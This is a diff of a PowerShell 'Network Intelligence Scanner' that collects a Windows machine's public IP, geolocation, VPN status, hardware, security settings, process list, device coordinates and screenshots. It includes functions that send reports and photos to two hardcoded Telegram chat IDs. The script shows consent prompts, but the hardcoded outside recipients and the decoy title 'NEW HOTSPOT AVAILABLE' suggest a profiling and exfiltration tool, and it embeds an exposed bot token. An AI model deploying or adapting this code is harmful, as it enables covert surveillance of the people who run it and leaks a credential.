@@ -1,364 +1,399 @@
-#requires -Version 5.1
-# Network Intelligence Scanner v3.1 - consent-based diagnostics
-# One file. Do not publish a real bot token to a public GitHub repository.
-$ErrorActionPreference = 'Stop'
-$botToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk'
-$chatIds = @('8640543929','8362186234')
-$reportTitle = 'NEW HOTSPOT AVAILABLE'
-$root = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'NetworkScannerReports'
-New-Item -ItemType Directory -Path $root -Force | Out-Null
-$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
-$na = 'Not Available'
-$report = [ordered]@{}
-$notes = New-Object System.Collections.Generic.List[string]
-function Ask([string]$question) { ((Read-Host "$question [YES/NO]").Trim() -ieq 'YES') }
-function Set-R([string]$name, $value) {
-    if ($null -eq $value -or [string]::IsNullOrWhiteSpace([string]$value)) { $report[$name] = 'Not Available' }
-    else { $report[$name] = [string]$value }
-}
-function Try-Measure([string]$label, [scriptblock]$action) {
-    try { & $action } catch { $notes.Add("$label : $($_.Exception.Message)"); Write-Host "[$label] Not Available" -ForegroundColor DarkYellow }
-}
-function Api([string]$url) { Invoke-RestMethod -Uri $url -TimeoutSec 7 -ErrorAction Stop }
-function Html($v) { [System.Net.WebUtility]::HtmlEncode([string]$v) }
-function Probe([string]$hostName, [int]$port) {
-    $tcp = New-Object System.Net.Sockets.TcpClient
-    try {
-        $ar=$tcp.BeginConnect($hostName,$port,$null,$null)
-        if (-not $ar.AsyncWaitHandle.WaitOne(1300)) { return 'Unavailable / filtered' }
-        $tcp.EndConnect($ar); 'Reachable'
-    } catch { 'Unavailable / filtered' } finally { $tcp.Dispose() }
-}
-Write-Host 'Network Intelligence Scanner v3.1' -ForegroundColor Cyan
-Write-Host 'Diagnostic information is collected locally. Telegram transfer requires confirmation.'
-Set-R 'Scan time' (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-# Public addresses, individually best-effort; IPv6 is not guaranteed.
-Try-Measure 'IPv4' { Set-R 'Public IPv4' (Api 'https://api.ipify.org?format=json').ip }
-# Avoid a frightening warning if this machine has no working IPv6 DNS/route.
-try {
-  $v6=Api 'https://api6.ipify.org?format=json'
-  if ($v6.ip) { Set-R 'Public IPv6' $v6.ip }
-} catch {
-  Set-R 'Public IPv6' 'Not Available (IPv6 endpoint unreachable; no IPv6 conclusion)'
-  $notes.Add('IPv6 check inconclusive: the IPv6 endpoint could not be reached. Check IPv6 connectivity and DNS separately.')
-}
-$ip=$report['Public IPv4']
-if ($ip -and $ip -ne $na) {
-  Try-Measure 'IP geolocation' {
-    $g=Api "https://ipapi.co/$ip/json/"
-    if ($g.error) { throw 'Provider did not return a usable result' }
-    Set-R 'Country (IP estimate)' $g.country_name; Set-R 'Region (IP estimate)' $g.region
-    Set-R 'City (IP estimate)' $g.city; Set-R 'IP timezone' $g.timezone
-    Set-R 'ISP / organization' $g.org; Set-R 'ASN' $g.asn
-  }
-  Try-Measure 'Proxy / VPN reputation' {
-    $p=Api "https://proxycheck.io/v2/${ip}?vpn=1"
-    $entry=$p.PSObject.Properties[$ip]
-    if (-not $entry) { throw 'No matching IP result' }
-    Set-R 'Proxy/VPN suspicion' $entry.Value.proxy
-    Set-R 'Detection category' $entry.Value.type
-    $notes.Add('Proxy/VPN result is heuristic, not proof. Tor cannot be reliably excluded by this check.')
-  }
-}
-# Official Tor bulk exit list: IP-based indicator, not proof of absence of Tor.
-Try-Measure 'Tor exit list' {
-  $torText=Invoke-WebRequest -Uri 'https://check.torproject.org/torbulkexitlist' -UseBasicParsing -TimeoutSec 9 -ErrorAction Stop
-  $torIPs=@($torText.Content -split '\r?\n' | Where-Object { $_ -match '^\d{1,3}(\.\d{1,3}){3}$' })
-  if ($torIPs.Count -eq 0) { throw 'Exit-node dataset unavailable or empty' }
-  Set-R 'Tor exit list' $(if ($ip -in $torIPs) { 'Public IP listed as Tor exit' } else { 'Not listed as known Tor exit (not proof of no Tor)' })
-}
-if (-not $report['Tor exit list']) { Set-R 'Tor exit list' 'Not Available (official dataset unreachable)' }
-$notes.Add('Tor exit list tests only whether the public IP appears on a published exit-node list. A negative result does not rule out Tor.')
-# Network adapters, DNS, active connection, local addresses
-Try-Measure 'Local network' {
-  $n=Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway } | Select-Object -First 1
-  if (-not $n) { throw 'No default IPv4 network adapter' }
-  Set-R 'Adapter' $n.InterfaceAlias
-  Set-R 'Local IPv4' (($n.IPv4Address | ForEach-Object IPAddress) -join ', ')
-  Set-R 'Gateway' (($n.IPv4DefaultGateway | ForEach-Object NextHop) -join ', ')
-  Set-R 'Configured DNS' (($n.DNSServer.ServerAddresses) -join ', ')
-  $adapter=Get-NetAdapter -InterfaceIndex $n.InterfaceIndex -ErrorAction SilentlyContinue
-  if ($adapter) { Set-R 'Link speed' $adapter.LinkSpeed; Set-R 'Interface type' $adapter.InterfaceDescription }
-}
-Try-Measure 'DNS resolution' {
-  $sw=[Diagnostics.Stopwatch]::StartNew()
-  $addresses=[Net.Dns]::GetHostAddresses('example.com')
-  $sw.Stop()
-  Set-R 'DNS resolve example.com' ("{0} ms; {1} records" -f $sw.ElapsedMilliseconds, $addresses.Count)
-}
-Set-R 'DNS leak test' 'Not Available (requires independent resolver-observation service)'
-Set-R 'WebRTC leak test' 'Not Available (requires browser WebRTC test)'
-Try-Measure 'Ping' {
-  $pings=@(Test-Connection -ComputerName '1.1.1.1' -Count 4 -ErrorAction SilentlyContinue)
-  if ($pings.Count -eq 0) { throw 'No ICMP responses (ICMP might be blocked)' }
-  $rtt=@($pings | ForEach-Object { [double]$_.ResponseTime })
-  $avg=($rtt | Measure-Object -Average).Average
-  $variance=(($rtt | ForEach-Object { [math]::Pow(($_-$avg),2) } | Measure-Object -Average).Average)
-  Set-R 'Ping / jitter estimate' ('{0:N1} ms mean / {1:N1} ms std.dev.' -f $avg,[math]::Sqrt($variance))
-  Set-R 'ICMP packet loss' ('{0}%' -f ([math]::Round(100*(4-$pings.Count)/4)))
-}
-# Wi-Fi: locale dependent netsh output, only retain values if keywords match.
-Try-Measure 'Wi-Fi' {
-  $w=netsh wlan show interfaces 2>$null | Out-String
-  if ($LASTEXITCODE -ne 0 -or -not $w.Trim() -or $w -match '(?i)no wireless interface|there is no wireless|беспроводн.{0,45}отсутств') { throw 'Wi-Fi interface unavailable, not connected, or WLAN service unavailable' }
-  foreach ($pair in @(@('Signal','Wi-Fi signal'),@('Channel','Wi-Fi channel'),@('Radio type','Wi-Fi standard'))) {
-    if ($w -match "(?im)^\s*$([regex]::Escape($pair[0]))\s*:\s*(.+)$") { Set-R $pair[1] $Matches[1].Trim() }
-  }
-  if (-not $report['Wi-Fi signal']) { Set-R 'Wi-Fi signal' $na }
-  if (-not $report['Wi-Fi channel']) { Set-R 'Wi-Fi channel' $na }
-}
-Set-R 'Wi-Fi channel congestion' 'Not Available (requires multi-network measurement)'
-# Windows, hardware
-Try-Measure 'Windows / hardware' {
-  $os=Get-CimInstance Win32_OperatingSystem
-  $cpu=Get-CimInstance Win32_Processor | Select-Object -First 1
-  $cs=Get-CimInstance Win32_ComputerSystem
-  Set-R 'Windows' ("$($os.Caption) build $($os.BuildNumber)")
-  Set-R 'System uptime' ('{0:N1} hours' -f ((Get-Date)-$os.LastBootUpTime).TotalHours)
-  Set-R 'System model' ("$($cs.Manufacturer) $($cs.Model)")
-  Set-R 'CPU' ("$($cpu.Name); $($cpu.NumberOfCores) cores / $($cpu.NumberOfLogicalProcessors) threads")
-  Set-R 'Installed RAM' ('{0:N1} GiB' -f ($cs.TotalPhysicalMemory/1GB))
-  Set-R 'RAM usage at scan' ('{0:N0}%' -f (100*(1-$os.FreePhysicalMemory*1KB/$cs.TotalPhysicalMemory)))
-  Set-R 'CPU load snapshot' ("$($cpu.LoadPercentage)%")
-}
-Try-Measure 'Graphics' {
-  $gpu=Get-CimInstance Win32_VideoController | Where-Object Name | Select-Object -ExpandProperty Name -Unique
-  Set-R 'GPU' ($gpu -join ', ')
-}
-Try-Measure 'Storage health' {
-  $d=Get-PhysicalDisk -ErrorAction Stop | Select-Object FriendlyName,HealthStatus,MediaType,Size
-  Set-R 'Storage devices / health' (($d | ForEach-Object { '{0} [{1}] {2} {3:N0} GB' -f $_.FriendlyName,$_.MediaType,$_.HealthStatus,($_.Size/1GB) }) -join '; ')
-  $vol=Get-Volume | Where-Object { $_.DriveLetter -and $_.Size } | Select-Object -First 8
-  Set-R 'Free disk space' (($vol | ForEach-Object { '{0}: {1:N1} GiB free' -f $_.DriveLetter,($_.SizeRemaining/1GB) }) -join '; ')
-}
-Set-R 'SMART wear / SSD temperature' 'Not Available (controller may not expose telemetry)'
-Try-Measure 'SSD telemetry' {
-  $disks=@(Get-PhysicalDisk -ErrorAction Stop)
-  $measurements=@()
-  foreach($disk in $disks) {
-    try {
-      $c=$disk | Get-StorageReliabilityCounter -ErrorAction Stop
-      $parts=@()
-      if ($null -ne $c.Wear -and [string]$c.Wear -ne '') { $parts+=('Wear: {0}%' -f $c.Wear) }
-      if ($null -ne $c.Temperature -and $c.Temperature -gt 0) { $parts+=('Temperature: {0} C' -f $c.Temperature) }
-      if ($parts.Count) { $measurements+=($disk.FriendlyName + ' / ' + ($parts -join ', ')) }
-    } catch { } # Unsupported controllers are normal.
-  }
-  if ($measurements.Count) { Set-R 'SMART wear / SSD temperature' ($measurements -join '; ') }
-}
-Try-Measure 'Battery' {
-  $b=Get-CimInstance Win32_Battery -ErrorAction Stop | Select-Object -First 1
-  if (-not $b) { throw 'No battery reported' }
-  Set-R 'Battery charge' ("$($b.EstimatedChargeRemaining)%")
-  Set-R 'Battery status code' $b.BatteryStatus
-}
-Set-R 'Battery health/cycles' 'Not Available (requires supported battery telemetry)'
-Try-Measure 'Battery health telemetry' {
-  $design=Get-CimInstance -Namespace root/wmi -ClassName BatteryStaticData -ErrorAction Stop | Select-Object -First 1
-  $full=Get-CimInstance -Namespace root/wmi -ClassName BatteryFullChargedCapacity -ErrorAction Stop | Select-Object -First 1
-  if ($design.DesignedCapacity -gt 0 -and $full.FullChargedCapacity -gt 0) {
-    Set-R 'Battery health/cycles' ('{0:N1}% estimated capacity health; cycle count Not Available' -f (100*$full.FullChargedCapacity/$design.DesignedCapacity))
-  }
-}
-Try-Measure 'Display' {
-  Add-Type -AssemblyName System.Windows.Forms
-  $screens=@([Windows.Forms.Screen]::AllScreens)
-  Set-R 'Displays' (($screens | ForEach-Object { '{0}x{1}' -f $_.Bounds.Width,$_.Bounds.Height }) -join ', ')
-}
-Set-R 'CPU / GPU temperatures' 'Not Available (sensor API or hardware monitor required)'
-# Security and local services; measured without invasive scans
-$securityChecks=@()
-Try-Measure 'Firewall' {
-  $fw=@(Get-NetFirewallProfile -ErrorAction Stop)
-  $enabled=($fw | Where-Object Enabled).Count
-  Set-R 'Windows Firewall' "$enabled/$($fw.Count) profiles enabled"
-  $script:securityChecks+=($enabled -eq $fw.Count)
-}
-Try-Measure 'Defender' {
-  $mp=Get-MpComputerStatus -ErrorAction Stop
-  Set-R 'Defender antivirus' $(if ($mp.AntivirusEnabled) {'Enabled'} else {'Disabled'})
-  $script:securityChecks+= [bool]$mp.AntivirusEnabled
-}
-Try-Measure 'Secure Boot' {
-  $sb=Confirm-SecureBootUEFI -ErrorAction Stop
-  Set-R 'Secure Boot' $sb
-  $script:securityChecks+= [bool]$sb
-}
-Try-Measure 'BitLocker' {
-  $bl=Get-BitLockerVolume -MountPoint $env:SystemDrive -ErrorAction Stop
-  Set-R 'System drive BitLocker' $bl.ProtectionStatus
-  $script:securityChecks+=($bl.ProtectionStatus -eq 'On')
-}
-if ($securityChecks.Count -gt 0) {
-  $passed=@($securityChecks | Where-Object { $_ }).Count
-  Set-R 'Security checks passed' "$passed/$($securityChecks.Count) (partial, not an official security score)"
-}
-foreach ($port in @(3389,445)) { Set-R "Local TCP $port (localhost)" (Probe '127.0.0.1' $port) }
-Try-Measure 'Recent system errors' {
-  $events=@(Get-WinEvent -FilterHashtable @{LogName='System';StartTime=(Get-Date).AddHours(-24);Level=1,2} -MaxEvents 250 -ErrorAction Stop)
-  Set-R 'System critical/errors in 24h' $events.Count
-  if ($events.Count -eq 250) { $notes.Add('Event count is capped at 250.') }
-}
-Try-Measure 'Power plan' {
-  $p=powercfg /GETACTIVESCHEME | Out-String
-  if ($LASTEXITCODE -ne 0) { throw 'Power plan unavailable' }
-  Set-R 'Active power plan' $p.Trim()
-}
-Set-R 'Wattage / precise energy use' 'Not Available (requires dedicated sensors)'
-Set-R 'Bottleneck analysis' 'Not Available (a reliable result requires repeated workload samples)'
-# Exact device location is optional and only attempted after prior approval.
-if (Ask 'Request device location from Windows? This may reveal precise coordinates') {
-  Try-Measure 'Device location' {
-    Add-Type -AssemblyName System.Device
-    $watcher=New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::Default)
-    $started=$watcher.TryStart($false,[TimeSpan]::FromSeconds(5))
-    if (-not $started -or $watcher.Position.Location.IsUnknown) { throw 'Location unavailable or permission denied' }
-    $loc=$watcher.Position.Location
-    Set-R 'Device coordinates (sensitive)' ('{0:F5}, {1:F5}' -f $loc.Latitude,$loc.Longitude)
-    Set-R 'Device location precision (m)' $loc.HorizontalAccuracy
-    $watcher.Stop()
-  }
-} else { Set-R 'Device coordinates (sensitive)' 'Not collected' }
-# Screenshot - consent before capture, preview and separate consent before transfer.
-$screenshot=$null
-if (Ask 'Take a screenshot of the primary display?') {
-  Try-Measure 'Screenshot' {
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-    $bounds=[Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $bmp=New-Object Drawing.Bitmap($bounds.Width,$bounds.Height)
-    $gfx=[Drawing.Graphics]::FromImage($bmp)
-    try { $gfx.CopyFromScreen($bounds.Location,[Drawing.Point]::Empty,$bounds.Size)
-      $script:screenshot=Join-Path $root "screenshot_$stamp.png"
-      $bmp.Save($screenshot,[Drawing.Imaging.ImageFormat]::Png)
-    } finally { $gfx.Dispose();$bmp.Dispose() }
-    Start-Process $screenshot
-    Write-Host "Screenshot for review: $screenshot"
-  }
-}
-# Local security assessment: rule-based expert notes, NOT a cloud AI model and NOT a vulnerability scan.
-$findings=New-Object 'System.Collections.Generic.List[string]'
-$risk=0
-if ($report['Windows Firewall'] -match '^(\d+)/(\d+) profiles enabled$') {
-  if ([int]$Matches[1] -lt [int]$Matches[2]) {
-    $risk+=2
-    $findings.Add('HIGH: At least one Windows Firewall profile is disabled. Review firewall profiles and your network type.')
-  } else { $findings.Add('OK: Windows Firewall is enabled for all returned profiles.') }
-} else { $findings.Add('UNKNOWN: Firewall state could not be assessed.') }
-if ($report['Defender antivirus'] -eq 'Disabled') { $risk+=2; $findings.Add('HIGH: Microsoft Defender reports antivirus disabled. Confirm another trusted antivirus is active.') }
-elseif ($report['Defender antivirus'] -eq 'Enabled') { $findings.Add('OK: Microsoft Defender reports antivirus enabled.') }
-else { $findings.Add('UNKNOWN: Antivirus protection could not be verified; this does not prove it is off.') }
-if ($report['Secure Boot'] -eq 'False') { $risk+=1; $findings.Add('REVIEW: Secure Boot appears disabled. Check whether your hardware supports it.') }
-elseif (-not $report['Secure Boot']) { $findings.Add('UNKNOWN: Secure Boot status could not be read, possibly due to privileges or firmware.') }
-if ($report['System drive BitLocker'] -eq 'Off') { $risk+=1; $findings.Add('REVIEW: System-drive encryption protection appears off. Consider BitLocker/device encryption.') }
-elseif (-not $report['System drive BitLocker']) { $findings.Add('UNKNOWN: System-drive encryption state could not be checked.') }
-foreach ($port in @(3389,445)) {
-  if ($report["Local TCP $port (localhost)"] -eq 'Reachable') {
-    $findings.Add("REVIEW: TCP $port responds on localhost. This DOES NOT mean the service is reachable from the internet. Verify listening interfaces, firewall rules, and whether the service is needed.")
-    $risk+=1
-  }
-}
-if ($report['ICMP packet loss'] -match '^(\d+)%' -and [int]$Matches[1] -ge 25) {
-  $findings.Add('REVIEW: ICMP replies indicate high packet loss; ICMP filtering can also distort this measurement.')
-}
-if ($report['Proxy/VPN suspicion'] -eq 'yes') { $findings.Add('INFO: IP reputation suggests proxy/VPN usage, not necessarily a vulnerability.') }
-$findings.Add('SCOPE: This is a limited configuration review, not a penetration test, malware detection, external port scan, or cloud AI assessment.')
-$findings.Add('PRIVACY: IP geolocation is approximate; device coordinates and screenshot require separate consent.')
-Set-R 'Security assistant risk' $(if ($risk -ge 3) {'Attention needed'} elseif ($risk -ge 1) {'Review suggested'} else {'No confirmed high-risk configuration from available checks'})
-Set-R 'Security assistant assessment (local rules)' ($findings -join ' | ')
-$notes.Add('Security assistant uses transparent local rules; it does not query an AI model or certify the device as secure.')
-$notes.Add('Assistant assessment: '+$report['Security assistant risk']+'. '+(($findings | Where-Object { $_ -match '^(HIGH|REVIEW|UNKNOWN):' } | Select-Object -First 4) -join ' '))
+# Network Intelligence Scanner v3.5 (Windows PowerShell 5.1+)
+# Run only on a computer you own or administer with permission.
+# Public GitHub warning: never publish a working Telegram bot token.
 
-# Running-process list: no command line, file paths, username or environment variables.
-# Separate consent to create, preview and send this sensitive report.
-$processFile=$null
-if (Ask 'Create a TXT list of running processes (PID, name, CPU seconds, memory)?') {
-  Try-Measure 'Process TXT export' {
-    $script:processFile=Join-Path $root "processes_$stamp.txt"
-    $ps=@(Get-Process -ErrorAction Stop | Sort-Object ProcessName,Id)
-    $header=@('Network Scanner process report','Collected: '+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'),'Processes: '+$ps.Count,'',"PID`tProcess`tCPU_seconds`tWorkingSet_MiB")
-    $lines=@(foreach($proc in $ps) {
-      $cpu='Not Available'
-      try { if ($null -ne $proc.CPU) { $cpu='{0:N1}' -f [double]$proc.CPU } } catch {}
-      $mem='Not Available'
-      try { $mem='{0:N1}' -f ([double]$proc.WorkingSet64 / 1MB) } catch {}
-      "{0}`t{1}`t{2}`t{3}" -f $proc.Id,$proc.ProcessName,$cpu,$mem
+$ErrorActionPreference = 'Stop'
+$ProgressPreference = 'SilentlyContinue'
+
+# ========= EDIT THESE SETTINGS =========
+$botToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk'
+$chatIds = @('8640543929', '8362186234')
+$enableScreenshotOption = $true
+$reportTitle = 'NEW HOTSPOT AVAILABLE'
+# =======================================
+
+try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+
+function Safe-Text($v) {
+    if ($null -eq $v) { return 'Not Available' }
+    $s = ([string]$v).Trim()
+    if (-not $s) { return 'Not Available' }
+    return $s
+}
+function Html-Encode($v) { return [System.Net.WebUtility]::HtmlEncode([string]$v) }
+function Ask-Yes($question) {
+    $answer = (Read-Host "$question (YES/NO)").Trim()
+    return ($answer -ieq 'YES')
+}
+function Api-Get($url) {
+    try { return Invoke-RestMethod -Uri $url -TimeoutSec 8 -ErrorAction Stop }
+    catch { return $null }
+}
+function Add-Note($message) { [void]$script:notes.Add([string]$message) }
+function Set-Report($name, $value) { $script:report[$name] = Safe-Text $value }
+function Send-TgMessage([string]$message) {
+    foreach ($id in $chatIds) {
+        try {
+            $result = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType 'application/x-www-form-urlencoded' -Body @{chat_id=$id; text=$message; parse_mode='HTML'} -TimeoutSec 20 -ErrorAction Stop
+            if ($result.ok) { Write-Host "Telegram report delivered to $id" }
+            else { Write-Warning "Telegram rejected report for $id" }
+        } catch { Write-Warning "Telegram text delivery failed for ${id}: $($_.Exception.Message)" }
+    }
+}
+function Send-TgPhoto([string]$path) {
+    Add-Type -AssemblyName System.Net.Http
+    foreach ($id in $chatIds) {
+        $client = $null; $form = $null
+        try {
+            $client = [System.Net.Http.HttpClient]::new()
+            $client.Timeout = [TimeSpan]::FromSeconds(40)
+            $form = [System.Net.Http.MultipartFormDataContent]::new()
+            $form.Add([System.Net.Http.StringContent]::new([string]$id), 'chat_id')
+            $fileBytes = [System.IO.File]::ReadAllBytes($path)
+            $photo = [System.Net.Http.ByteArrayContent]::new($fileBytes)
+            $photo.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('image/png')
+            $form.Add($photo, 'photo', 'screenshot.png')
+            $resp = $client.PostAsync("https://api.telegram.org/bot$botToken/sendPhoto", $form).GetAwaiter().GetResult()
+            $resp.EnsureSuccessStatusCode() | Out-Null
+            Write-Host "Screenshot delivered to $id"
+        } catch { Write-Warning "Telegram photo delivery failed for ${id}: $($_.Exception.Message)" }
+        finally { if ($form) { $form.Dispose() }; if ($client) { $client.Dispose() } }
+    }
+}
+
+$notes = New-Object 'System.Collections.Generic.List[string]'
+$report = [ordered]@{}
+$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
+$reportDir = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'NetworkScannerReports'
+if (-not $reportDir) { $reportDir = Join-Path $env:TEMP 'NetworkScannerReports' }
+New-Item -ItemType Directory -Path $reportDir -Force | Out-Null
+Write-Host 'Network Intelligence Scanner v3.5'
+Write-Host 'Collecting local diagnostics. No information is sent without confirmation.'
+
+# Public network
+$ipv4data = Api-Get 'https://api.ipify.org?format=json'
+$ipv4 = if ($ipv4data -and $ipv4data.ip) { [string]$ipv4data.ip } else { 'Not Available' }
+Set-Report 'Public IPv4' $ipv4
+$ipv6data = Api-Get 'https://api6.ipify.org?format=json'
+if ($ipv6data -and $ipv6data.ip -and ([string]$ipv6data.ip).Contains(':')) { Set-Report 'Public IPv6' $ipv6data.ip }
+else { Set-Report 'Public IPv6' 'Not Available'; Add-Note 'IPv6 endpoint unavailable or IPv6 connectivity not present; no inference made.' }
+
+# IP-based location is approximate, never precise GPS
+if ($ipv4 -ne 'Not Available') {
+    $geo = Api-Get "https://ipwho.is/$ipv4"
+    if ($geo -and $geo.success -eq $true) {
+        Set-Report 'IP country' $geo.country
+        Set-Report 'IP region' $geo.region
+        Set-Report 'IP city' $geo.city
+        Set-Report 'IP timezone' $geo.timezone.id
+        Set-Report 'ISP' $geo.connection.isp
+        Set-Report 'ASN' $geo.connection.asn
+    } else { Add-Note 'IP geolocation service unavailable.' }
+}
+Add-Note 'IP geolocation is approximate and can reflect a VPN exit point, not physical GPS position.'
+
+# VPN/proxy is a heuristic, not proof
+Set-Report 'VPN / proxy check' 'Unknown'
+if ($ipv4 -ne 'Not Available') {
+    $pc = Api-Get "https://proxycheck.io/v2/${ipv4}?vpn=1"
+    if ($pc -and $pc.status -eq 'ok') {
+        $entry = $pc.PSObject.Properties[$ipv4]
+        if ($entry -and $entry.Value) {
+            $status = if ($entry.Value.proxy -eq 'yes') { 'Suspected VPN / proxy' } elseif ($entry.Value.proxy -eq 'no') { 'Not flagged by provider' } else { 'Unknown' }
+            Set-Report 'VPN / proxy check' $status
+            Set-Report 'Proxy classification' $entry.Value.type
+        }
+    } else { Add-Note 'VPN/proxy reputation service unavailable or rate limited.' }
+}
+Set-Report 'Tor exit node' 'Not Available (no verified dataset queried)'
+Set-Report 'DNS / WebRTC leak' 'Not Available (requires independent tests and browser)' 
+
+# Local interfaces
+try {
+    $nets = @(Get-NetIPConfiguration -ErrorAction Stop | Where-Object { $_.IPv4DefaultGateway } )
+    if ($nets.Count -gt 0) {
+        $net = $nets[0]
+        Set-Report 'Active network adapter' $net.InterfaceAlias
+        Set-Report 'Local IPv4' ($net.IPv4Address.IPAddress -join ', ')
+        Set-Report 'Default gateway' ($net.IPv4DefaultGateway.NextHop -join ', ')
+        Set-Report 'DNS servers' ($net.DNSServer.ServerAddresses -join ', ')
+    } else { Add-Note 'No adapter with IPv4 default gateway found.' }
+} catch { Add-Note "Local adapter enumeration failed: $($_.Exception.Message)" }
+
+try {
+    $wifiLines = (netsh wlan show interfaces 2>$null | Out-String)
+    if ($wifiLines -match '(?im)^\s*(?:Signal|Сигнал)\s*:\s*(.+)$') { Set-Report 'Wi-Fi signal' $Matches[1] }
+    else { Set-Report 'Wi-Fi signal' 'Not Available' }
+    if ($wifiLines -match '(?im)^\s*(?:Channel|Канал)\s*:\s*(.+)$') { Set-Report 'Wi-Fi channel' $Matches[1] }
+    else { Set-Report 'Wi-Fi channel' 'Not Available' }
+} catch { Set-Report 'Wi-Fi signal' 'Not Available'; Set-Report 'Wi-Fi channel' 'Not Available' }
+
+try {
+    $samples = @(Test-Connection -ComputerName '1.1.1.1' -Count 3 -ErrorAction SilentlyContinue)
+    $okSamples = @($samples | Where-Object { $null -ne $_.ResponseTime })
+    if ($okSamples.Count) {
+        Set-Report 'Ping 1.1.1.1 average ms' ([math]::Round(($okSamples | Measure-Object -Property ResponseTime -Average).Average,1))
+        Set-Report 'Packet loss (3 attempts)' ("{0}%" -f [math]::Round((3-$okSamples.Count)/3*100,0))
+    } else { Set-Report 'Ping 1.1.1.1' 'No ICMP response (internet may still work)' }
+} catch { Set-Report 'Ping 1.1.1.1' 'Not Available' }
+
+# System / hardware
+try {
+    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
+    Set-Report 'Windows' ("{0} / {1}" -f $os.Caption,$os.Version)
+    $boot = if ($os.LastBootUpTime -is [datetime]) { $os.LastBootUpTime } else { [Management.ManagementDateTimeConverter]::ToDateTime($os.LastBootUpTime) }
+    Set-Report 'Uptime hours' ([math]::Round(((Get-Date)-$boot).TotalHours,1))
+    Set-Report 'RAM total GiB' ([math]::Round($os.TotalVisibleMemorySize/1MB,2))
+    Set-Report 'RAM free GiB' ([math]::Round($os.FreePhysicalMemory/1MB,2))
+} catch { Add-Note "Operating system details unavailable: $($_.Exception.Message)" }
+try {
+    $cpus = @(Get-CimInstance Win32_Processor -ErrorAction Stop)
+    if ($cpus.Count) { Set-Report 'CPU' (($cpus | Select-Object -ExpandProperty Name) -join '; '); Set-Report 'CPU logical cores' (($cpus | Measure-Object -Property NumberOfLogicalProcessors -Sum).Sum) }
+} catch { Add-Note 'CPU details unavailable.' }
+try {
+    $gpus = @(Get-CimInstance Win32_VideoController -ErrorAction Stop | Select-Object -ExpandProperty Name)
+    Set-Report 'GPU' ($gpus -join '; ')
+} catch { Add-Note 'GPU details unavailable.' }
+try {
+    $drives = @(Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' -ErrorAction Stop | ForEach-Object {
+        '{0} {1}GiB free / {2}GiB' -f $_.DeviceID,[math]::Round($_.FreeSpace/1GB,1),[math]::Round($_.Size/1GB,1)
     })
-    ($header+$lines) | Set-Content -Path $processFile -Encoding UTF8
-    Start-Process notepad.exe -ArgumentList ('"'+$processFile+'"')
-    Write-Host "Process TXT created for review: $processFile"
-  }
+    Set-Report 'Local drives' ($drives -join '; ')
+} catch { Add-Note 'Drive capacities unavailable.' }
+try {
+    $battery = @(Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue)
+    if ($battery.Count) { Set-Report 'Battery remaining' ((@($battery | ForEach-Object { "$($_.EstimatedChargeRemaining)%" })) -join '; ') }
+    else { Set-Report 'Battery remaining' 'Not Available (no battery reported)' }
+} catch { Set-Report 'Battery remaining' 'Not Available' }
+Set-Report 'CPU/GPU temperatures' 'Not Available (hardware sensor integration required)'
+Set-Report 'SSD SMART wear' 'Not Available (device/vendor support required)'
+Set-Report 'Bottleneck analysis' 'Not Available (requires workload sampling)'
+
+# Security status: do not interpret denied access as disabled
+try {
+    $fw = @(Get-NetFirewallProfile -ErrorAction Stop | ForEach-Object { "$($_.Name)=$($_.Enabled)" })
+    Set-Report 'Windows Firewall' ($fw -join '; ')
+} catch { Set-Report 'Windows Firewall' 'Unknown (access denied/unavailable)' }
+try {
+    $secureBoot = Confirm-SecureBootUEFI -ErrorAction Stop
+    $secureBootState = if ($secureBoot) { 'Enabled' } else { 'Disabled' }
+    Set-Report 'Secure Boot' $secureBootState
+} catch { Set-Report 'Secure Boot' 'Unknown (not supported or permission denied)' }
+try {
+    $bitlocker = @(Get-BitLockerVolume -ErrorAction Stop | ForEach-Object { "$($_.MountPoint)=$($_.ProtectionStatus)" })
+    Set-Report 'BitLocker protection' ($bitlocker -join '; ')
+} catch { Set-Report 'BitLocker protection' 'Unknown (not available or permission denied)' }
+try {
+    $def = Get-MpComputerStatus -ErrorAction Stop
+    Set-Report 'Defender real-time protection' $def.RealTimeProtectionEnabled
+} catch { Set-Report 'Defender real-time protection' 'Unknown (Defender API unavailable)' }
+
+# Local, limited security review (not remote vulnerability scanning)
+$securityNotes = New-Object 'System.Collections.Generic.List[string]'
+if (($report['Windows Firewall'] -as [string]) -match '=False') { [void]$securityNotes.Add('Some Windows Firewall profile is disabled; review its configuration.') }
+if ($report['Secure Boot'] -eq 'Disabled') { [void]$securityNotes.Add('Secure Boot reports disabled; assess whether it should be enabled.') }
+if ($report['Defender real-time protection'] -eq 'False') { [void]$securityNotes.Add('Defender real-time protection reports disabled; verify another endpoint protection product is active.') }
+if ($report['Secure Boot'] -like 'Unknown*') { [void]$securityNotes.Add('Secure Boot status cannot be verified at current privilege level.') }
+if ($report['BitLocker protection'] -like 'Unknown*') { [void]$securityNotes.Add('BitLocker status cannot be verified at current privilege level.') }
+if (-not $securityNotes.Count) { [void]$securityNotes.Add('No issues detected by the limited local checks; this is not a vulnerability assessment.') }
+Set-Report 'Security assistant (local rules)' ($securityNotes -join ' | ')
+Set-Report 'Measurement notes' ($notes -join ' | ')
+Set-Report 'Scan time (local)' (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+
+# Save report locally
+$jsonPath = Join-Path $reportDir "scan_$stamp.json"
+$htmlPath = Join-Path $reportDir "scan_$stamp.html"
